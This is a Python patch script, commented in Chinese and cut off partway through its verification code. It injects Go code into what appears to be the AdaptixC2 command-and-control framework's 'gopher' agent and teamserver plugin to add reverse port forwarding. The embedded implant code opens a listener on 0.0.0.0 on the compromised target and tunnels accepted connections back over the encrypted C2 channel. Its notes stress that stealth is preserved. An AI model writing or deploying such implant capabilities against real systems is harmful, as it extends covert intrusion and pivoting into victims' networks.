#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
批次9 —— rportfwd（反向端口转发）补齐

模式：  python3 l2p_rportfwd.py status | check | apply | revert | verify

## 为什么会有这个脚本

rportfwd 在本交付物里是**上游半成品**：API 返回 ok、GUI 显示 Reverse port forward +
p_active:true，但目标机上没有任何端口在监听，永远零流量 —— **静默假成功**。

## 实测（不是推测）—— 缺口全在 gopher 这一侧，服务端 core **零改动**

链路（上游设计是完整的）：

    [teamserver] TsTunnelStart(REVERSE) → Callbacks.Reverse(tunnelId, port)
       → 插件构造 {COMMAND_TUNNEL_REVERSE, tunnelId, port} 下发 agent
    [agent] net.Listen(0.0.0.0:port) → 回 {COMMAND_TUNNEL_REVERSE, tunnelId, result}
    [teamserver] TsTunnelUpdateRportfwd(tunnelId, result) → GUI 转 Active
    [外部] 连目标机:port → agent accept → 分配 channelId
       → **先**推 {COMMAND_TUNNEL_ACCEPT, tunnelId, channelId}
       → **再**开 TUNNEL_PACK 通道
    [teamserver] TsTunnelConnectionAccept → handlerReverseAccept
       → net.Dial(Fhost:Fport) + RegisterChannel + relaySocketToTunnel

服务端**已经全部就位**，一行都不用改：
    core/server/ts_tunnels.go:421   TsTunnelCreate 的 REVERSE 元数据
    core/server/ts_tunnels.go:317   TsTunnelStart 的 REVERSE 分支
    core/server/ts_tunnels.go:477   TsTunnelUpdateRportfwd
    core/server/ts_tunnels.go:719   TsTunnelConnectionAccept
    core/server/ts_tunnels.go:856   handlerReverseAccept（完整实现）
    core/server/ts_tunnels.go:732   它的调用点
★ 更正（勿照抄旧结论）：handleTunChannelCreate / handleTunChannelCreateClient 的
  switch 只到 LOCAL_PORT —— 那两条是 **lportfwd/socks 的路径**，REVERSE 不走它们。
  我此前据此判定「要动共享核心三处、波及所有 agent 类型」，**是误判**。

listener 也**一行不用改**：gopher_listener_tcp/pl_transport.go:562 的
TsTunnelChannelExists(channelId) 那道门是对的 —— 只要 agent **先**推 ACCEPT
（teamserver 据此建通道）**再**开 TUNNEL_PACK，门自然通过。顺序反了才被拒。

## 本批次改的 4 个文件（10 处锚点）

teamserver 侧插件（gopher_agent/）：
    ① pl_utils.go    + COMMAND_TUNNEL_REVERSE=67 / COMMAND_TUNNEL_ACCEPT=68
                     ★ 与上游 beacon_agent/pl_utils.go:58-59 **同值** —— 交叉判据 V3 会盯住
    ② pl_utils.go    + ParamsTunnelReverse / AnsTunnelReverse / ParamsTunnelAccept
    ③ pl_main.go     TunnelMessageReverse（原为**空壳**：packData 从不赋值 ⇒ 下发空任务）
    ④ pl_main.go     Type-1 switch + case COMMAND_TUNNEL_REVERSE（监听结果回报）
    ⑤ pl_main.go     Type-2 switch + case COMMAND_TUNNEL_ACCEPT（新通道通告）

agent 运行时（gopher_agent/src_gopher/）：
    ⑥ utils/utils.go + 两个常量 + 三个类型（与插件侧逐字段同构）
    ⑦ tasks.go       dispatch + case COMMAND_TUNNEL_REVERSE
    ⑧ tasks.go       新增 4 个函数（预置连接表 2 个 + taskTunnelReverse + pushTunnelAccept）
    ⑨ tasks.go       jobTunnel 的 dial **之后**插入预置连接表查询（dial 行本身一字不改）
    ⑩ tasks.go       tunnelReverseConn（把 accept 到的连接交给 jobTunnel 的管道）

## ★★ 复用策略（本批次最重要的设计决定）

jobTunnel（正向 lportfwd）与反向路径**只差 clientConn 从哪来**（dial vs accept）。
所以第 ⑨ 处**只在 dial 之后插一段预置连接表查询**，后续全部管道逻辑
（AES-CTR 双向流、pause/resume、TUNNELS 注册、closeOnce 收尾）**一行不改地复用**，
连 dial 那一行本身都保持原样。

    替代方案（把下半段抄成第二个函数）被否决：那份管道里有 axDirKey 双向密钥派生、
    ctrl.Paused 暂停语义、TUNNELS 生命周期 —— 抄一份必然与原件漂移，
    而漂移出来的第二份没有批次5 的验收背书。判据纪律里明确反对「两处各写一份」。

⇒ 正向路径的行为**除「dial 被一次 map 查询短路」外逐字节不变**，
  反向路径完全复用**已被批次5/7 验收过的**那条加密通道。隐匿性不损失（同密钥派生、同通道）。

## 安全约束（全程遵守）

  · scratch 一律 /root/gp5probe/**（往 /tmp 放文件会触发 p17 T6 假红）
  · 没有 git ⇒ 本脚本 + .bak 是唯一回滚手段，REVERT 段与 APPLY 段写在一起
  · 不碰运行态、不碰 /root/cc/run/extenders/ 里的 .so（install 需另行授权）
"""

import os
import re
import shutil
import subprocess
import sys

EXT = "/root/cc/AdaptixServer/extenders"
AGT = os.path.join(EXT, "gopher_agent")
BEACON = os.path.join(EXT, "beacon_agent")

# ★ 用户裁定：全树 .bak-* 统一 BAKDIR（批次8 起）
BAKDIR = "/root/gp5probe/bak"

T_PLUTILS = os.path.join(AGT, "pl_utils.go")
T_PLMAIN = os.path.join(AGT, "pl_main.go")
T_UTILS = os.path.join(AGT, "src_gopher", "utils", "utils.go")
T_TASKS = os.path.join(AGT, "src_gopher", "tasks.go")

# 回滚点：<树>.<文件名>.bak-rpf
EDBACK = {
    T_PLUTILS: os.path.join(BAKDIR, "gopher_agent.pl_utils.go.bak-rpf"),
    T_PLMAIN: os.path.join(BAKDIR, "gopher_agent.pl_main.go.bak-rpf"),
    T_UTILS: os.path.join(BAKDIR, "gopher_agent.src_gopher.utils.utils.go.bak-rpf"),
    T_TASKS: os.path.join(BAKDIR, "gopher_agent.src_gopher.tasks.go.bak-rpf"),
}

# 上游交叉判据的锚（beacon 是 Go 版里唯一有完整 REVERSE 实现的）
T_BEACON_UTILS = os.path.join(BEACON, "pl_utils.go")

# ─────────────────────────────────────────────────────────────────────────────
# 10 处锚点。约定（与 l2p_uafix.py 相同，lint 会强制）：
#   · old 必须在目标文件里**恰好出现一次**
#   · old 必须是 new 的**连续子串**（⇒ 插入式改动一律以原文为骨、在其中插行，
#     绝不能把 old 写成首行 + 尾行两行连写而 new 中间多出注释 —— 那个坑登记过）
#   · 每处都带 why，供 check 失败时打印人话理由
# ─────────────────────────────────────────────────────────────────────────────

C_PLUTILS_CONST_OLD = "\tCOMMAND_TUNNEL_RESUME = 34\n"
C_PLUTILS_CONST_NEW = (
    "\tCOMMAND_TUNNEL_RESUME = 34\n"
    "\n"
    "\t// ★ 批次9（rportfwd）：与上游 beacon_agent/pl_utils.go:58-59 **同值**。\n"
    "\t// 取同一个数字不是凑巧 —— 全项目共用一套命令码表，改一处就要改全部 agent，\n"
    "\t// 判据 V3 会交叉核对这两个值，防止将来某一侧单独漂移。\n"
    "\tCOMMAND_TUNNEL_REVERSE = 67\n"
    "\tCOMMAND_TUNNEL_ACCEPT  = 68\n"
)

C_PLUTILS_TYPE_OLD = (
    "type ParamsTunnelResume struct {\n"
    "\tChannelId int `msgpack:\"channel_id\"`\n"
    "}\n"
)
C_PLUTILS_TYPE_NEW = (
    "type ParamsTunnelResume struct {\n"
    "\tChannelId int `msgpack:\"channel_id\"`\n"
    "}\n"
    "\n"
    "// ★ 批次9（rportfwd）。三个结构与 src_gopher/utils/utils.go 里的同名结构\n"
    "// **必须逐字段一致**（msgpack 按字段名编解码）—— 判据 V4 会逐字段比对，\n"
    "// 因为这两份定义分处两个 module，编译器管不到它们的一致性。\n"
    "type ParamsTunnelReverse struct {\n"
    "\tTunnelId int `msgpack:\"tunnel_id\"`\n"
    "\tPort     int `msgpack:\"port\"`\n"
    "}\n"
    "\n"
    "// AnsTunnelReverse 是 agent 对「监听起没起」的回答。Result: 1=已监听, 0=监听失败。\n"
    "type AnsTunnelReverse struct {\n"
    "\tTunnelId int `msgpack:\"tunnel_id\"`\n"
    "\tResult   int `msgpack:\"result\"`\n"
    "}\n"
    "\n"
    "type ParamsTunnelAccept struct {\n"
    "\tTunnelId  int `msgpack:\"tunnel_id\"`\n"
    "\tChannelId int `msgpack:\"channel_id\"`\n"
    "}\n"
)

C_PLMAIN_REVERSE_OLD = (
    "func TunnelMessageReverse(tunnelId int, port int) adaptix.TaskData {\n"
    "\tvar packData []byte\n"
    "\t/// START CODE HERE\n"
)
C_PLMAIN_REVERSE_NEW = (
    "func TunnelMessageReverse(tunnelId int, port int) adaptix.TaskData {\n"
    "\tvar packData []byte\n"
    "\t/// START CODE HERE\n"
    "\t// ★ 批次9：原实现是**空壳** —— packData 从不赋值，makeProxyTask(nil) 下发的是一枚\n"
    "\t//   空任务，agent 收到什么也不做。这就是「API ok / GUI 看似成功 / 零流量」的第一因。\n"
    "\t//   写法沿用本文件自己的惯用法（msgpack 包 Command），**不照抄 beacon 的 packer 数组** ——\n"
    "\t//   gopher 的 agent 解析的是 Command{Code, Id, Data}，两套编码不通用。\n"
    "\tpackerData, _ := msgpack.Marshal(ParamsTunnelReverse{TunnelId: tunnelId, Port: port})\n"
    "\tcmd := Command{Code: COMMAND_TUNNEL_REVERSE, Data: packerData}\n"
    "\tpackData, _ = msgpack.Marshal(cmd)\n"
)

# Type-1 switch（普通任务结果）尾部。锚点取 COMMAND_ERROR 整块 + default，
# 确保唯一（Type-2 的 default 是 goto HANDLER，这里是 continue，两者不同）。
C_PLMAIN_T1_OLD = (
    "\t\t\t\ttask.Message = fmt.Sprintf(\"Error %s\", params.Error)\n"
    "\t\t\t\ttask.MessageType = adaptix.MESSAGE_ERROR\n"
)
C_PLMAIN_T1_NEW = (
    "\t\t\t\ttask.Message = fmt.Sprintf(\"Error %s\", params.Error)\n"
    "\t\t\t\ttask.MessageType = adaptix.MESSAGE_ERROR\n"
    "\n"
    "\t\t\tcase COMMAND_TUNNEL_REVERSE:\n"
    "\t\t\t\t// ★ 批次9：agent 回答「反向端口转发的监听起没起」。\n"
    "\t\t\t\t//   走 Type-1（普通任务结果）而不是 Type-2 —— 它是**对下发任务的回答**，\n"
    "\t\t\t\t//   任务 id 由外层 dispatch 原样带回，这里不需要另造关联 id。\n"
    "\t\t\t\tvar params AnsTunnelReverse\n"
    "\t\t\t\terr := msgpack.Unmarshal(cmd.Data, &params)\n"
    "\t\t\t\tif err != nil {\n"
    "\t\t\t\t\tcontinue\n"
    "\t\t\t\t}\n"
    "\t\t\t\t// TsTunnelUpdateRportfwd 返回 (taskId, message, err)，成功即把 GUI 置 Active\n"
    "\t\t\t\ttask.TaskId, task.Message, err = Ts.TsTunnelUpdateRportfwd(params.TunnelId, params.Result == 1)\n"
    "\t\t\t\tif err != nil {\n"
    "\t\t\t\t\ttask.MessageType = adaptix.MESSAGE_ERROR\n"
    "\t\t\t\t} else {\n"
    "\t\t\t\t\ttask.MessageType = adaptix.MESSAGE_SUCCESS\n"
    "\t\t\t\t}\n"
)

# Type-2 switch（异步通路，Job{CommandId, JobId, Data}）的头部锚点。★ 3 个 tab
C_PLMAIN_T2_OLD = "\t\t\tswitch job.CommandId {\n"
C_PLMAIN_T2_NEW = (
    "\t\t\tswitch job.CommandId {\n"
    "\n"
    "\t\t\tcase COMMAND_TUNNEL_ACCEPT:\n"
    "\n"
    "\t\t\t\t// ★ 批次9：agent 通告「目标机上有人连进来了，这是新分配的 channelId」。\n"
    "\t\t\t\t//   必须走 Type-2（异步）—— 它**不是**对某个任务的回答，是 agent 主动发起的事件。\n"
    "\t\t\t\t//   服务端在这里才第一次知道 channelId ⇒ 建通道 + 拨 Fhost:Fport\n"
    "\t\t\t\t//   （TsTunnelConnectionAccept → handlerReverseAccept）。\n"
    "\t\t\t\t//   ★ teamserver 必须先完成这一步，agent 随后那条 TUNNEL_PACK 才能过\n"
    "\t\t\t\t//     listener 的 TsTunnelChannelExists 门。\n"
    "\t\t\t\tvar params ParamsTunnelAccept\n"
    "\t\t\t\terr := msgpack.Unmarshal(job.Data, &params)\n"
    "\t\t\t\tif err != nil {\n"
    "\t\t\t\t\tgoto HANDLER\n"
    "\t\t\t\t}\n"
    "\t\t\t\tTs.TsTunnelConnectionAccept(params.TunnelId, params.ChannelId)\n"
    "\t\t\t\ttask.Message = fmt.Sprintf(\"Reverse port forward: accepted channel %d\", params.ChannelId)\n"
    "\t\t\t\ttask.MessageType = adaptix.MESSAGE_SUCCESS\n"
)

C_UTILS_CONST_OLD = "\tCOMMAND_TUNNEL_RESUME = 34\n"
C_UTILS_CONST_NEW = (
    "\tCOMMAND_TUNNEL_RESUME = 34\n"
    "\n"
    "\t// ★ 批次9（rportfwd）：与 pl_utils.go、beacon_agent/pl_utils.go **同值**（判据 V3 交叉核对）\n"
    "\tCOMMAND_TUNNEL_REVERSE = 67\n"
    "\tCOMMAND_TUNNEL_ACCEPT  = 68\n"
)

C_UTILS_TYPE_OLD = (
    "type ParamsTunnelResume struct {\n"
    "\tChannelId int `msgpack:\"channel_id\"`\n"
    "}\n"
)
C_UTILS_TYPE_NEW = (
    "type ParamsTunnelResume struct {\n"
    "\tChannelId int `msgpack:\"channel_id\"`\n"
    "}\n"
    "\n"
    "// ★ 批次9（rportfwd）。与 gopher_agent/pl_utils.go 里的同名结构**逐字段一致**\n"
    "// （msgpack 按字段名编解码；两份定义分处两个 module，编译器管不到）—— 判据 V4 比对。\n"
    "type ParamsTunnelReverse struct {\n"
    "\tTunnelId int `msgpack:\"tunnel_id\"`\n"
    "\tPort     int `msgpack:\"port\"`\n"
    "}\n"
    "\n"
    "type AnsTunnelReverse struct {\n"
    "\tTunnelId int `msgpack:\"tunnel_id\"`\n"
    "\tResult   int `msgpack:\"result\"`\n"
    "}\n"
    "\n"
    "type ParamsTunnelAccept struct {\n"
    "\tTunnelId  int `msgpack:\"tunnel_id\"`\n"
    "\tChannelId int `msgpack:\"channel_id\"`\n"
    "}\n"
)

C_TASKS_DISPATCH_OLD = (
    "\t\tcase utils.COMMAND_TUNNEL_RESUME:\n"
    "\t\t\ttaskTunnelResume(command.Data)\n"
)
C_TASKS_DISPATCH_NEW = (
    "\t\tcase utils.COMMAND_TUNNEL_RESUME:\n"
    "\t\t\ttaskTunnelResume(command.Data)\n"
    "\n"
    "\t\tcase utils.COMMAND_TUNNEL_REVERSE:\n"
    "\t\t\t// ★ 批次9：**有返回值**，与上面几个 tunnel 命令不同 ——\n"
    "\t\t\t//   它们的结果走 TUNNEL_PACK 通道，而「监听起没起」必须作为**任务回答**回给\n"
    "\t\t\t//   teamserver，否则 GUI 永远停在「已创建但未激活」。\n"
    "\t\t\tdata, err = taskTunnelReverse(command.Data)\n"
)

# 第 ⑨ 处：jobTunnel 的那一次 dial。★ 这是全批次唯一触碰正向路径的地方，
# 改动语义 = dial 之前先查一次预置连接表（反向命中，正向必然不命中）。
C_TASKS_DIAL_OLD = (
    "\t\tactive := true\n"
    "\t\treason := byte(0)\n"
    "\t\tclientConn, err := net.DialTimeout(params.Proto, params.Address, pivotDialTimeout)\n"
)
C_TASKS_DIAL_NEW = (
    "\t\tactive := true\n"
    "\t\treason := byte(0)\n"
    "\t\tclientConn, err := net.DialTimeout(params.Proto, params.Address, pivotDialTimeout)\n"
    "\n"
    "\t\t// ★ 批次9（rportfwd）：反向端口转发的 clientConn 是 **accept 来的**，不是 dial 来的。\n"
    "\t\t//   命中「预置连接表」就丢弃这次 dial 的结果、改用预置连接。\n"
    "\t\t//   ★ 插入点**特意选在 dial 之后**而不是之前 —— 这样上面那行 dial 一个字都不用改，\n"
    "\t\t//     「正向路径逐字节不变」就成了字面事实，而不是我的断言。\n"
    "\t\t//   反向时 params.Address 为空 ⇒ net.DialTimeout 立即报 missing port 返回整数，\n"
    "\t\t//   不产生任何网络流量、不解析任何名字；随后被这里的 err = nil 覆盖。\n"
    "\t\tif pre, ok := axTakePreconn(params.ChannelId); ok {\n"
    "\t\t\tif clientConn != nil {\n"
    "\t\t\t\t_ = clientConn.Close()\n"
    "\t\t\t}\n"
    "\t\t\tclientConn = pre\n"
    "\t\t\terr = nil\n"
    "\t\t}\n"
)

# 第 ⑧ 处：新增函数块，插在 pivotDialTimeout 常量之后（jobTunnel 之前）
C_TASKS_NEWFUNCS_OLD = "const pivotDialTimeout = 3 * time.Second\n"
C_TASKS_NEWFUNCS_NEW = (
    "const pivotDialTimeout = 3 * time.Second\n"
    "\n"
    "// ── 批次9：反向端口转发（rportfwd）─────────────────────────────────────────\n"
    "\n"
    "// axPreconns 暂存「已经 accept、等着经 C2 通道回连 teamserver」的连接。\n"
    "// ★ 用 map 而不是给 jobTunnel 加参数：jobTunnel 的调用点（dispatch）不改，\n"
    "// 正向路径的唯一改动就是 dial 后多一次查表。\n"
    "var axPreconns sync.Map\n"
    "\n"
    "func axPutPreconn(channelId int, c net.Conn) { axPreconns.Store(channelId, c) }\n"
    "\n"
    "func axTakePreconn(channelId int) (net.Conn, bool) {\n"
    "\tv, ok := axPreconns.LoadAndDelete(channelId)\n"
    "\tif !ok {\n"
    "\t\treturn nil, false\n"
    "\t}\n"
    "\tc, ok := v.(net.Conn)\n"
    "\treturn c, ok\n"
    "}\n"
    "\n"
    "// axRandChannelId 生成反向通道的 channelId。\n"
    "// ★ 用 crypto/rand（本文件既有 idiom，与 tunKey/tunIv 的 rand.Read 同源），不用 math/rand：\n"
    "// 正向通道的 channelId 由 teamserver 分配、反向由 agent 自分配，两者共用 agent 侧\n"
    "// TUNNELS 这张按 channelId 索引的表 ⇒ 小值、可预测的 id 有撞表风险。\n"
    "// ★ 掩掉最高位：agent 要交叉编译到 6 个平台（含 32 位），那里 int 是 32 位，\n"
    "// 不自掩会得到负数。\n"
    "func axRandChannelId() int {\n"
    "\tvar b [4]byte\n"
    "\tif _, err := rand.Read(b[:]); err != nil {\n"
    "\t\treturn 0\n"
    "\t}\n"
    "\tv := uint32(b[0])<<24 | uint32(b[1])<<16 | uint32(b[2])<<8 | uint32(b[3])\n"
    "\treturn int(v & 0x7fffffff)\n"
    "}\n"
    "\n"
    "// taskTunnelReverse 在**目标机**上监听 params.Port（rportfwd 的第一步）。\n"
    "//\n"
    "// 与 jobTunnel 的区别：jobTunnel 是「teamserver 让我去连某处」，\n"
    "// 这里是「teamserver 让我开一个监听」—— 方向相反，所以监听地址是 0.0.0.0\n"
    "// （rportfwd 的全部意义就是让外部能连到目标机的这个端口；\n"
    "// 上游 TsTunnelCreateRportfwd 没有 Lhost 参数，也无法收窄）。\n"
    "//\n"
    "// ★ 返回值即「监听起没起」，作为任务回答回给 teamserver（走 Type-1）。\n"
    "func taskTunnelReverse(paramsData []byte) ([]byte, error) {\n"
    "\tvar params utils.ParamsTunnelReverse\n"
    "\tif err := msgpack.Unmarshal(paramsData, &params); err != nil {\n"
    "\t\treturn nil, err\n"
    "\t}\n"
    "\n"
    "\tln, err := net.Listen(\"tcp\", fmt.Sprintf(\"0.0.0.0:%d\", params.Port))\n"
    "\tif err != nil {\n"
    "\t\t// 监听失败也要回结果 —— 让 GUI 显示失败，而不是永远停在「看起来成功」。\n"
    "\t\treturn msgpack.Marshal(utils.AnsTunnelReverse{TunnelId: params.TunnelId, Result: 0})\n"
    "\t}\n"
    "\n"
    "\tgo func() {\n"
    "\t\tfor {\n"
    "\t\t\tc, aerr := ln.Accept()\n"
    "\t\t\tif aerr != nil {\n"
    "\t\t\t\t_ = ln.Close()\n"
    "\t\t\t\treturn\n"
    "\t\t\t}\n"
    "\t\t\tgo tunnelReverseConn(c, params.TunnelId)\n"
    "\t\t}\n"
    "\t}()\n"
    "\n"
    "\treturn msgpack.Marshal(utils.AnsTunnelReverse{TunnelId: params.TunnelId, Result: 1})\n"
    "}\n"
    "\n"
    "// tunnelReverseConn 把一条 accept 到的外部连接，经 C2 通道交给 teamserver。\n"
    "//\n"
    "// ★★ 顺序是硬要求，反了就是改造前那种「静默假成功」：\n"
    "// teamserver 侧 pl_transport.go 的 TUNNEL_PACK 分支**先查** TsTunnelChannelExists，\n"
    "// 通道不存在直接拒收。而反向的通道是 **agent 主动申请**的，teamserver 事先\n"
    "// 不可能知道 channelId ⇒ 必须先推 COMMAND_TUNNEL_ACCEPT 让它建通道\n"
    "// （并在那里 net.Dial(Fhost:Fport)），再开 TUNNEL_PACK。\n"
    "func tunnelReverseConn(clientConn net.Conn, tunnelId int) {\n"
    "\t// channelId 由 agent 侧分配：反向是 agent 主动开通道，teamserver 无法预先指定。\n"
    "\t// （正向相反 —— 上游 beacon 的 channelId 直接取 teamserver 下发的 TaskId。）\n"
    "\tchannelId := axRandChannelId()\n"
    "\tif channelId == 0 {\n"
    "\t\t_ = clientConn.Close()\n"
    "\t\treturn\n"
    "\t}\n"
    "\n"
    "\tif !pushTunnelAccept(tunnelId, channelId) {\n"
    "\t\t_ = clientConn.Close()\n"
    "\t\treturn\n"
    "\t}\n"
    "\n"
    "\t// 把连接交给 jobTunnel 的管道（复用，不重写）\n"
    "\taxPutPreconn(channelId, clientConn)\n"
    "\tparams, _ := msgpack.Marshal(utils.ParamsTunnelStart{Proto: \"tcp\", ChannelId: channelId})\n"
    "\tjobTunnel(params)\n"
    "}\n"
    "\n"
    "// pushTunnelAccept 异步告知 teamserver「有新通道」。走 Type-2（Job）通路，\n"
    "// 与 jobRun 的输出推送同一套写法（DialProfile + Banner + EncryptData(SKey) + SendMsg）。\n"
    "// 返回是否送达 —— 送不出去就不要开 TUNNEL_PACK，否则 teamserver 侧必然拒收。\n"
    "func pushTunnelAccept(tunnelId int, channelId int) bool {\n"
    "\tconn, err := DialProfile(profile, profile.Addresses[0])\n"
    "\tif err != nil {\n"
    "\t\treturn false\n"
    "\t}\n"
    "\tdefer conn.Close()\n"
    "\n"
    "\tbody, _ := msgpack.Marshal(utils.ParamsTunnelAccept{TunnelId: tunnelId, ChannelId: channelId})\n"
    "\tjob := utils.Job{\n"
    "\t\tCommandId: utils.COMMAND_TUNNEL_ACCEPT,\n"
    "\t\tJobId:     fmt.Sprintf(\"%08x\", channelId),\n"
    "\t\tData:      body,\n"
    "\t}\n"
    "\tpackedJob, _ := msgpack.Marshal(job)\n"
    "\tmessage := utils.Message{Type: 2, Object: [][]byte{packedJob}}\n"
    "\tsendData, _ := msgpack.Marshal(message)\n"
    "\tsendData, _ = utils.EncryptData(sendData, utils.SKey)\n"
    "\n"
    "\tif profile.BannerSize > 0 {\n"
    "\t\tif _, err := functions.ConnRead(conn, profile.BannerSize); err != nil {\n"
    "\t\t\treturn false\n"
    "\t\t}\n"
    "\t}\n"
    "\treturn functions.SendMsg(conn, sendData) == nil\n"
    "}\n"
)

TEXTS = [
    (T_PLUTILS, C_PLUTILS_CONST_OLD, C_PLUTILS_CONST_NEW,
     "插件侧命令码表缺 COMMAND_TUNNEL_REVERSE/ACCEPT"),
    (T_PLUTILS, C_PLUTILS_TYPE_OLD, C_PLUTILS_TYPE_NEW,
     "插件侧缺 ParamsTunnelReverse/AnsTunnelReverse/ParamsTunnelAccept"),
    (T_PLMAIN, C_PLMAIN_REVERSE_OLD, C_PLMAIN_REVERSE_NEW,
     "TunnelMessageReverse 是空壳 ⇒ 下发的是一枚空任务（静默假成功第一因）"),
    (T_PLMAIN, C_PLMAIN_T1_OLD, C_PLMAIN_T1_NEW,
     "Type-1 switch 缺 case COMMAND_TUNNEL_REVERSE（监听结果回不来）"),
    (T_PLMAIN, C_PLMAIN_T2_OLD, C_PLMAIN_T2_NEW,
     "Type-2 switch 缺 case COMMAND_TUNNEL_ACCEPT（新通道通告没人收）"),
    (T_UTILS, C_UTILS_CONST_OLD, C_UTILS_CONST_NEW,
     "agent 侧缺 COMMAND_TUNNEL_REVERSE/ACCEPT"),
    (T_UTILS, C_UTILS_TYPE_OLD, C_UTILS_TYPE_NEW,
     "agent 侧缺三个 msgpack 结构"),
    (T_TASKS, C_TASKS_DISPATCH_OLD, C_TASKS_DISPATCH_NEW,
     "agent 侧 dispatch 缺 COMMAND_TUNNEL_REVERSE"),
    (T_TASKS, C_TASKS_NEWFUNCS_OLD, C_TASKS_NEWFUNCS_NEW,
     "agent 侧缺 rportfwd 的四个新函数"),
    (T_TASKS, C_TASKS_DIAL_OLD, C_TASKS_DIAL_NEW,
     "jobTunnel 的 dial 未做「先查预置连接表」⇒ 反向连接无处可去"),
]

FILES = (T_PLUTILS, T_PLMAIN, T_UTILS, T_TASKS)
GOFMT_FILES = (T_UTILS, T_TASKS, T_PLUTILS, T_PLMAIN)


def rd(p):
    with open(p, "r", encoding="utf-8") as f:
        return f.read()


def wr(p, s):
    with open(p, "w", encoding="utf-8") as f:
        f.write(s)


def md5(p):
    import hashlib
    return hashlib.md5(open(p, "rb").read()).hexdigest()


def bak():
    os.makedirs(BAKDIR, exist_ok=True)
    for p in FILES:
        b = EDBACK[p]
        if not os.path.exists(b):
            shutil.copy2(p, b)


def back():
    """从回滚点恢复。已存在的回滚点**不覆盖** ⇒ 可重复调用。"""
    n = 0
    for p in FILES:
        b = EDBACK[p]
        if os.path.exists(b):
            shutil.copy2(b, p)
            n += 1
    return n


def lint():
    """静态自检：old 唯一 + old 是 new 的连续子串。任一处不过就拒绝 apply。"""
    errs = []
    for p, old, new, why in TEXTS:
        if not os.path.exists(p):
            errs.append("缺文件 %s（%s）" % (p, why))
            continue
        s = rd(p)
        c = s.count(old)
        if c != 1:
            errs.append("锚点不唯一：%s 里 old 出现 %d 次（应为 1）—— %s\n          old=%r"
                        % (os.path.basename(p), c, why, old[:80]))
            continue
        if old not in new:
            errs.append("old 不是 new 的连续子串（违反 lint 硬要求）：%s —— %s\n          old=%r"
                        % (os.path.basename(p), why, old[:80]))
    return errs


def state():
    """每处：done=目标态在场 / todo=待改 / ???=两者都不在（异常）"""
    out = []
    for p, old, new, why in TEXTS:
        if not os.path.exists(p):
            out.append((why, "MISS", p))
            continue
        s = rd(p)
        if new in s:
            out.append((why, "done", p))
        elif old in s:
            out.append((why, "todo", p))
        else:
            out.append((why, "???", p))
    return out


def do_status():
    print("== 批次9 rportfwd：状态 ==")
    for why, st, p in state():
        print("  [%-4s] %s" % (st, why))
    print("")
    print("== 回滚点（%s）==" % BAKDIR)
    for p in FILES:
        b = EDBACK[p]
        print("  %s  %s" % (md5(b) if os.path.exists(b) else "(无)", os.path.basename(b)))
    print("")
    print("== 上游交叉锚（beacon，判据 V3 用）==")
    print("  %s" % T_BEACON_UTILS)


def do_apply():
    errs = lint()
    if errs:
        print("LINT FAIL：")
        for e in errs:
            print("  - %s" % e)
        return 1
    bak()
    n = 0
    for p, old, new, why in TEXTS:
        s = rd(p)
        if new in s:
            print("  [skip] %s（已是目标态）" % why)
            continue
        s2 = s.replace(old, new, 1)
        if s2 == s:
            print("  [BAD ] %s（替换未生效）" % why)
            return 1
        wr(p, s2)
        n += 1
        print("  [ok  ] %s" % why)
    print("APPLY 完成：%d 处" % n)
    return 0


def do_revert():
    n = back()
    print("REVERT 完成：%d 个文件已从回滚点恢复" % n)
    left = [w for w, st, p in state() if st != "todo"]
    if left:
        print("★ 注意：以下锚点恢复后仍非 todo 态（回滚点可能来自中间态）：")
        for x in left:
            print("   - %s" % x)
    return 0


def _code_only(s):
    """剥掉 Go 的行注释与块注释 —— 计数型判据必须先剥注释，
    否则注释里提到的标识符会把计数灌水（这个坑登记过）。"""
    s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
    s = re.sub(r"//[^\n]*", "", s)
    return s


def ck(cond, okmsg, badmsg):
    if cond:
        print("  [ok  ] %s" % okmsg)
    else:
        print("  [FAIL] %s" % badmsg)
    return bool(cond)


def do_verify():
    ok = True
    print("== V1 锚点全部落到目标态 ==")
    st = state()
    ok &= ck(all(x[1] == "done" for x in st),
             "10/10 处锚点均为 done",
             "未全绿：%s" % ", ".join("%s=%s" % (w[:22], s) for w, s, p in st if s != "done"))

    print("== V2 lint 复检（old 唯一 + old 是 new 连续子串）==")
    e = lint()
    ok &= ck(not e, "lint 无错", "lint 有错：%s" % e)

    print("== V3 交叉判据：命令码与上游 beacon 同值 ==")
    try:
        be = rd(T_BEACON_UTILS)
        m67 = re.search(r"COMMAND_TUNNEL_REVERSE\s*=\s*(\d+)", be)
        m68 = re.search(r"COMMAND_TUNNEL_ACCEPT\s*=\s*(\d+)", be)
        if not m67 or not m68:
            ok &= ck(False, "", "取不到 beacon 的 REVERSE/ACCEPT 码值 ⇒ 同值性无从判定，不能记 PASS")
        else:
            for f, label in ((T_PLUTILS, "插件"), (T_UTILS, "agent")):
                s = rd(f)
                a = re.search(r"COMMAND_TUNNEL_REVERSE\s*=\s*(\d+)", s)
                b = re.search(r"COMMAND_TUNNEL_ACCEPT\s*=\s*(\d+)", s)
                ok &= ck(bool(a) and a.group(1) == m67.group(1),
                         "%s COMMAND_TUNNEL_REVERSE = %s（beacon 也是 %s）" % (label, m67.group(1), m67.group(1)),
                         "%s 的 COMMAND_TUNNEL_REVERSE 与 beacon 不一致（beacon=%s 本地=%s）⇒ 命令码漂移"
                         % (label, m67.group(1), a.group(1) if a else "缺"))
                ok &= ck(bool(b) and b.group(1) == m68.group(1),
                         "%s COMMAND_TUNNEL_ACCEPT = %s（beacon 也是 %s）" % (label, m68.group(1), m68.group(1)),
                         "%s 的 COMMAND_TUNNEL_ACCEPT 与 beacon 不一致（beacon=%s 本地=%s）⇒ 命令码漂移"
                         % (label, m68.group(1), b.group(1) if b else "缺"))
    except Exception as ex:
        ok &= ck(False, "", "V3 执行异常：%s" % ex)

    print("== V4 跨 module 结构同构（msgpack 按字段名编解码，编译器管不到）==")
    try:
        def fields(src, name):
            m = re.search(r"type\s+%s\s+struct\s*\{(.*?)\n\}" % name, src, re.S)
            if not m:
                return None
            return re.findall(r"(\w+)\s+(\w+)\s+`msgpack:\"([^\"]+)\"`", m.group(1))
        a_src, b_src = rd(T_PLUTILS), rd(T_UTILS)
        for nm in ("ParamsTunnelReverse", "AnsTunnelReverse", "ParamsTunnelAccept"):
            fa, fb = fields(a_src, nm), fields(b_src, nm)
            ok &= ck(fa is not None and fb is not None and fa == fb,
                     "%s 两侧逐字段一致：%s" % (nm, fa),
                     "%s 两侧不一致 ⇒ msgpack 编解码会错位 | 插件=%s | agent=%s" % (nm, fa, fb))
    except Exception as ex:
